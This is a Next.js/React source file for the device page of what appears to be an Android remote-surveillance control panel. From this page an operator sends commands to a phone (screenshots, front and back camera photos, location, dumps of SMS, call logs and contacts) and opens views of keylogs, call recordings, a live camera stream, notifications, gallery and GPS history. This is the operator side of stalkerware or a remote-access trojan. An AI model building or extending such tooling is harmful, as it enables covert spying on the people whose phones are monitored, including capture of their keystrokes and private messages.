'use client';

import { useEffect, useState, useCallback, Suspense } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import Sidebar from '@/components/layout/Sidebar';
import Header from '@/components/layout/Header';
import { connectSocket, pingDevice } from '@/lib/socket';
import { getDevice, dispatchCommand, getCommandHistory } from '@/lib/api';
import { useAuthStore, useDevicesStore } from '@/lib/store';
import { formatDistanceToNow, format } from 'date-fns';
import {
    Smartphone,
    MapPin,
    MessageSquare,
    Phone,
    Users,
    Keyboard,
    Bell,
    Image,
    Camera,
    Monitor,
    Send,
    RefreshCw,
    CheckCircle,
    Clock,
    XCircle,
    ChevronRight,
    ChevronDown,
    Video,
    Wifi,
    WifiOff,
    Zap,
    ArrowLeft,
    Mic,
    BarChart3,
} from 'lucide-react';
import Link from 'next/link';

const commandButtons = [
    { type: 'capture_screenshot', label: 'Screenshot', icon: Monitor, color: 'blue' },
    { type: 'capture_photo', label: 'Front Camera', icon: Camera, color: 'purple', payload: { camera: 'front' } },
    { type: 'capture_photo', label: 'Back Camera', icon: Camera, color: 'orange', payload: { camera: 'back' } },
    { type: 'get_location', label: 'Get Location', icon: MapPin, color: 'emerald' },
    { type: 'dump_sms', label: 'Sync SMS (7d)', icon: MessageSquare, color: 'pink', payload: { days: 7 } },
    { type: 'dump_sms', label: 'Sync SMS (All)', icon: MessageSquare, color: 'pink' },
    { type: 'dump_calls', label: 'Sync Calls (7d)', icon: Phone, color: 'cyan', payload: { days: 7 } },
    { type: 'dump_calls', label: 'Sync Calls (All)', icon: Phone, color: 'cyan' },
    { type: 'dump_contacts', label: 'Sync Contacts', icon: Users, color: 'indigo' },
];

const dataLinks = [
    { href: 'stream', label: 'Live Camera', icon: Video, color: 'red', description: 'Real-time feed' },
    { href: 'recordings', label: 'Recordings', icon: Mic, color: 'yellow', description: 'Call recordings' },
    { href: 'sms', label: 'SMS', icon: MessageSquare, color: 'blue', description: 'Text messages' },
    { href: 'calls', label: 'Calls', icon: Phone, color: 'emerald', description: 'Call logs' },
    { href: 'contacts', label: 'Contacts', icon: Users, color: 'purple', description: 'Contact list' },
    { href: 'keylogs', label: 'Keylogs', icon: Keyboard, color: 'orange', description: 'Keystrokes' },
    { href: 'notifications', label: 'Notifications', icon: Bell, color: 'pink', description: 'App alerts' },
    { href: 'gallery', label: 'Gallery', icon: Image, color: 'cyan', description: 'Photos & media' },
    { href: 'location', label: 'Location', icon: MapPin, color: 'yellow', description: 'GPS history' },
];

export default function DeviceDetailPage() {
    return (
        <Suspense fallback={
            <div className="min-h-screen flex items-center justify-center bg-[var(--background)]">
                <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-[var(--primary)]"></div>
            </div>
        }>
            <DeviceDetailContent />
        </Suspense>
    );
}

function DeviceDetailContent() {
    const router = useRouter();
    const searchParams = useSearchParams();
    const deviceId = searchParams.get('id') as string;
    const { isAuthenticated, isHydrated } = useAuthStore();

    const [device, setDevice] = useState<any>(null);
    const [commands, setCommands] = useState<any[]>([]);
    const [loading, setLoading] = useState(true);
    const [commandLoading, setCommandLoading] = useState<string | null>(null);
    const [cooldown, setCooldown] = useState<number>(0);
    const [checkingStatus, setCheckingStatus] = useState(false);
    const [showStats, setShowStats] = useState(false);
    const { updateDevice } = useDevicesStore();

    const handleCheckStatus = async () => {
        if (!device?.deviceId || checkingStatus) return;
        setCheckingStatus(true);
        try {
            const result = await pingDevice(device.deviceId);
            setDevice((prev: any) => ({ ...prev, isOnline: result.online }));
            updateDevice(device.deviceId, { isOnline: result.online });
        } catch (error) {
            console.error('Status check failed:', error);
        } finally {
            setCheckingStatus(false);
        }
    };

    const fetchDevice = useCallback(async () => {
        try {
            setLoading(true);
            const [deviceData, commandsData] = await Promise.all([
                getDevice(deviceId),
                getCommandHistory(deviceId, 10),
            ]);

            if (deviceData.success) {
                setDevice(deviceData.device);
            }
            if (commandsData.success) {
                setCommands(commandsData.commands);
            }
        } catch (error) {
            console.error('Failed to fetch device:', error);
        } finally {
            setLoading(false);
        }
    }, [deviceId]);

    useEffect(() => {
        if (isHydrated && !isAuthenticated) {
            router.push('/login');
        }
    }, [isHydrated, isAuthenticated, router]);

    useEffect(() => {
        if (isAuthenticated && deviceId) {
            fetchDevice();

            const socket = connectSocket();

            socket.on('device:online', (data: { deviceId: string }) => {
                if (data.deviceId === deviceId) {
                    setDevice((prev: any) => prev ? { ...prev, isOnline: true } : prev);
                }
            });

            socket.on('device:offline', (data: { deviceId: string }) => {
                if (data.deviceId === deviceId) {
                    setDevice((prev: any) => prev ? { ...prev, isOnline: false } : prev);
                }
            });

            return () => {
                socket.off('device:online');
                socket.off('device:offline');
            };
        }
    }, [isAuthenticated, deviceId, fetchDevice]);

    useEffect(() => {
        if (cooldown > 0) {
            const timer = setTimeout(() => setCooldown(prev => prev - 1), 1000);
            return () => clearTimeout(timer);
        }
    }, [cooldown]);

    const handleCommand = async (type: string, payload?: any) => {
        if (cooldown > 0) return;

        setCommandLoading(type);
        try {
            const res = await dispatchCommand(deviceId, type, payload);
            if (res.success) {
                setCooldown(5);
                setTimeout(async () => {
                    const data = await getCommandHistory(deviceId, 10);
                    if (data.success) {
                        setCommands(data.commands);
                    }
                }, 500);
            }
        } catch (error: any) {
            console.error('Failed to dispatch command:', error);
            if (error.response?.data?.code === 'RATE_LIMIT') {
                setCooldown(5);
            }
        } finally {
            setCommandLoading(null);
        }
    };

    if (!isHydrated || !isAuthenticated) return null;

    if (loading) {
        return (
            <div className="flex min-h-screen bg-[var(--background)]">
                <Sidebar />
                <main className="flex-1 lg:ml-72">
                    <Header title="Loading..." />
                    <div className="p-4 lg:p-8">
                        <div className="card skeleton h-48 lg:h-64"></div>
                    </div>
                </main>
            </div>
        );
    }

    if (!device) {
        return (
            <div className="flex min-h-screen bg-[var(--background)]">
                <Sidebar />
                <main className="flex-1 lg:ml-72">
                    <Header title="Device Not Found" />
                    <div className="p-4 lg:p-8">
                        <div className="card bg-white text-center py-12">
                            <Smartphone className="w-12 h-12 mx-auto mb-4 text-[var(--muted)]" />
                            <h3 className="text-lg font-semibold mb-2 text-[var(--foreground)]">Device Not Found</h3>
                            <p className="text-[var(--muted)]">The requested device could not be found.</p>
                        </div>
                    </div>
                </main>
            </div>
        );
    }

    return (
        <div className="flex min-h-screen bg-[var(--background)]">
            <Sidebar />
            <main className="flex-1 lg:ml-72">
                <Header
                    title={device.model || 'Device'}
                    subtitle={device.isOnline ? 'Currently Online' : 'Offline'}
                    onRefresh={fetchDevice}
                    deviceId={device.deviceId}
                    deviceInfo={{
                        androidVersion: device.androidVersion,
                        model: device.model,
                    }}
                />

                <div className="p-4 lg:p-8 max-w-7xl mx-auto space-y-6 lg:space-y-8 animate-fade-in">
                    {/* Back Button */}
                    <Link
                        href="/devices"
                        className="inline-flex items-center gap-2 text-[var(--muted)] hover:text-[var(--foreground)] transition-colors text-sm font-medium"
                    >
                        <ArrowLeft className="w-4 h-4" />
                        Back to Devices
                    </Link>

                    {/* Device Info Card */}
                    <div className="card bg-white p-6 lg:p-8 relative overflow-hidden">
                        {/* Top accent */}
                        <div className={`absolute top-0 left-0 right-0 h-1 ${device.isOnline
                            ? 'bg-gradient-to-r from-emerald-400 to-teal-400'
                            : 'bg-gradient-to-r from-slate-200 to-slate-300'
                            }`} />

                        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6 pt-2">
                            <div className="flex items-center gap-4 lg:gap-6">
                                <div className={`w-16 h-16 lg:w-20 lg:h-20 rounded-2xl flex items-center justify-center transition-all ${device.isOnline
                                    ? 'bg-gradient-to-br from-emerald-400 to-teal-500 shadow-lg shadow-emerald-500/20'
                                    : 'bg-slate-100 border border-[var(--border)]'
                                    }`}>
                                    <Smartphone className={`w-8 h-8 lg:w-10 lg:h-10 ${device.isOnline ? 'text-white' : 'text-slate-400'}`} />
                                </div>
                                <div>
                                    <div className="flex flex-wrap items-center gap-3 mb-2">
                                        <h2 className="text-xl lg:text-2xl font-bold text-[var(--foreground)]">{device.model || 'Unknown Device'}</h2>
                                        <span className={`badge ${device.isOnline ? 'badge-online' : 'badge-offline'}`}>
                                            {device.isOnline ? <><Wifi className="w-3 h-3" /> Online</> : <><WifiOff className="w-3 h-3" /> Offline</>}
                                        </span>
                                        <button
                                            onClick={handleCheckStatus}
                                            disabled={checkingStatus}
                                            className="flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-bold bg-indigo-50 text-indigo-600 border border-indigo-100 hover:bg-indigo-100 transition-all disabled:opacity-50"
                                        >
                                            <RefreshCw className={`w-3 h-3 ${checkingStatus ? 'animate-spin' : ''}`} />
                                            {checkingStatus ? 'Checking...' : 'Check Status'}
                                        </button>
                                    </div>
                                    <div className="flex flex-wrap items-center gap-2 text-sm text-[var(--muted)]">
                                        <span className="font-semibold text-[var(--primary)] bg-[var(--primary-glow)] px-2 py-0.5 rounded-md text-xs">
                                            Android {device.androidVersion}
                                        </span>
                                        <span>•</span>
                                        <span>{device.manufacturer}</span>
                                        <span>•</span>
                                        <span className="flex items-center gap-1">
                                            <Clock className="w-3.5 h-3.5" />
                                            {formatDistanceToNow(new Date(device.lastSeen), { addSuffix: true })}
                                        </span>
                                    </div>
                                </div>
                            </div>

                            {/* Cooldown indicator */}
                            {cooldown > 0 && (
                                <div className="flex items-center gap-3 px-4 py-2 rounded-xl bg-[var(--primary-glow)] border border-[var(--primary)]/20">
                                    <span className="text-xs font-semibold text-[var(--primary)]">Cooldown</span>
                                    <div className="flex gap-1">
                                        {[...Array(5)].map((_, i) => (
                                            <div key={i} className={`h-2 w-4 rounded-full transition-all ${i < cooldown ? 'bg-[var(--primary)]' : 'bg-slate-200'}`} />
                                        ))}
                                    </div>
                                </div>
                            )}
                        </div>

                        {/* Collapsible Stats Section */}
                        {Object.keys(device.stats || {}).length > 0 && (
                            <div className="mt-6 pt-6 border-t border-[var(--border)]">
                                <button
                                    onClick={() => setShowStats(!showStats)}
                                    className="w-full flex items-center justify-between text-left group"
                                >
                                    <div className="flex items-center gap-3">
                                        <div className="w-8 h-8 rounded-lg bg-indigo-50 border border-indigo-100 flex items-center justify-center">
                                            <BarChart3 className="w-4 h-4 text-indigo-500" />
                                        </div>
                                        <span className="font-semibold text-sm text-[var(--foreground)]">Device Statistics</span>
                                        <span className="text-xs text-[var(--muted)] bg-slate-100 px-2 py-0.5 rounded-full">
                                            {Object.keys(device.stats || {}).length} metrics
                                        </span>
                                    </div>
                                    <ChevronDown className={`w-5 h-5 text-[var(--muted)] transition-transform duration-200 ${showStats ? 'rotate-180' : ''}`} />
                                </button>

                                {showStats && (
                                    <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-3 mt-4 animate-fade-in">
                                        {Object.entries(device.stats || {}).map(([key, value]: [string, any]) => (
                                            <div key={key} className="text-center p-3 rounded-xl bg-[var(--background)] border border-[var(--border)]">
                                                <div className="text-xl lg:text-2xl font-bold text-[var(--foreground)]">{value}</div>
                                                <div className="text-xs font-medium text-[var(--muted)] capitalize mt-1">{key.replace(/([A-Z])/g, ' $1')}</div>
                                            </div>
                                        ))}
                                    </div>
                                )}
                            </div>
                        )}
                    </div>

                    <div className="grid grid-cols-1 xl:grid-cols-3 gap-6 lg:gap-8">
                        {/* Control Matrix */}
                        <div className="xl:col-span-2 space-y-6 lg:space-y-8">
                            {/* Commands Section */}
                            <section>
                                <div className="flex items-center gap-3 mb-4 lg:mb-6">
                                    <div className="w-10 h-10 rounded-xl bg-[var(--primary-glow)] border border-[var(--primary)]/20 flex items-center justify-center">
                                        <Send className="w-5 h-5 text-[var(--primary)]" />
                                    </div>
                                    <h3 className="text-lg font-bold text-[var(--foreground)]">Quick Commands</h3>
                                </div>
                                <div className="grid grid-cols-2 lg:grid-cols-3 gap-3 lg:gap-4">
                                    {commandButtons.map((cmd) => {
                                        const Icon = cmd.icon;
                                        const isLoading = commandLoading === cmd.type;
                                        const isDisabled = cooldown > 0 || !!commandLoading;
                                        return (
                                            <button
                                                key={`${cmd.type}-${cmd.payload?.camera || ''}`}
                                                onClick={() => handleCommand(cmd.type, cmd.payload)}
                                                disabled={isDisabled}
                                                className={`card bg-white p-4 lg:p-5 flex flex-col items-center gap-3 text-center group ${isDisabled ? 'opacity-40 cursor-not-allowed' : 'hover:shadow-lg hover:border-[var(--primary)]/30'}`}
                                            >
                                                <div className={`w-12 h-12 lg:w-14 lg:h-14 rounded-xl bg-${cmd.color}-50 flex items-center justify-center border border-${cmd.color}-100 group-hover:scale-110 transition-transform`}>
                                                    {isLoading ? (
                                                        <RefreshCw className="w-6 h-6 animate-spin text-[var(--primary)]" />
                                                    ) : (
                                                        <Icon className={`w-6 h-6 text-${cmd.color}-500`} />
                                                    )}
                                                </div>
                                                <span className="font-semibold text-sm text-[var(--foreground)]">{cmd.label}</span>
                                            </button>
                                        );
                                    })}
                                </div>
                            </section>

                            {/* Data Links Section */}
                            <section>
                                <div className="flex items-center gap-3 mb-4 lg:mb-6">
                                    <div className="w-10 h-10 rounded-xl bg-purple-50 border border-purple-100 flex items-center justify-center">
                                        <Image className="w-5 h-5 text-purple-500" />
                                    </div>
                                    <h3 className="text-lg font-bold text-[var(--foreground)]">Device Data</h3>
                                </div>
                                <div className="grid grid-cols-2 lg:grid-cols-3 gap-3 lg:gap-4">
                                    {dataLinks.map((link) => {
                                        const Icon = link.icon;
                                        return (
                                            <Link key={link.href} href={`/devices/view/${link.href}/?id=${deviceId}`}>
                                                <div className={`card bg-white p-4 lg:p-5 flex flex-col items-center gap-3 text-center group hover:shadow-lg hover:border-[var(--primary)]/30`}>
                                                    <div className={`w-12 h-12 lg:w-14 lg:h-14 rounded-xl bg-${link.color}-50 flex items-center justify-center border border-${link.color}-100 group-hover:scale-110 transition-transform`}>
                                                        <Icon className={`w-6 h-6 text-${link.color}-500`} />
                                                    </div>
                                                    <div>
                                                        <span className="font-semibold text-sm text-[var(--foreground)] block">{link.label}</span>
                                                        <span className="text-xs text-[var(--muted)]">{link.description}</span>
                                                    </div>
                                                </div>
                                            </Link>
                                        );
                                    })}
                                </div>
                            </section>
                        </div>

                        {/* Activity Log */}
                        <div className="space-y-4">
                            <div className="flex items-center gap-3">
                                <div className="w-10 h-10 rounded-xl bg-slate-100 border border-[var(--border)] flex items-center justify-center">
                                    <Clock className="w-5 h-5 text-[var(--muted)]" />
                                </div>
                                <h3 className="text-lg font-bold text-[var(--foreground)]">Activity Log</h3>
                            </div>
                            <div className="card bg-white p-0 overflow-hidden">
                                {commands.length === 0 ? (
                                    <div className="p-8 text-center text-[var(--muted)]">
                                        <Zap className="w-8 h-8 mx-auto mb-2 opacity-30" />
                                        <p className="font-medium text-sm">No recent activity</p>
                                    </div>
                                ) : (
                                    <div className="divide-y divide-[var(--border)]">
                                        {commands.map((cmd) => (
                                            <div key={cmd.id} className="p-4 flex items-center justify-between hover:bg-[var(--background)] transition-colors">
                                                <div>
                                                    <p className="font-semibold text-sm text-[var(--foreground)] capitalize">{cmd.type.replace(/_/g, ' ')}</p>
                                                    <p className="text-xs text-[var(--muted)] mt-0.5">
                                                        {format(new Date(cmd.createdAt), 'MMM d, HH:mm')}
                                                    </p>
                                                </div>
                                                <div className={`flex items-center gap-1.5 px-2 py-1 rounded-lg text-xs font-semibold ${cmd.status === 'completed' ? 'bg-emerald-50 text-emerald-600' :
                                                    cmd.status === 'failed' ? 'bg-red-50 text-red-600' :
                                                        'bg-blue-50 text-blue-600'
                                                    }`}>
                                                    {cmd.status === 'completed' && <CheckCircle className="w-3 h-3" />}
                                                    {cmd.status === 'failed' && <XCircle className="w-3 h-3" />}
                                                    {(cmd.status === 'pending' || cmd.status === 'sent') && <RefreshCw className="w-3 h-3 animate-spin" />}
                                                    <span className="capitalize">{cmd.status}</span>
                                                </div>
                                            </div>
                                        ))}
                                    </div>
                                )}
                            </div>
                        </div>
                    </div>
                </div>
            </main>
        </div>
    );
}
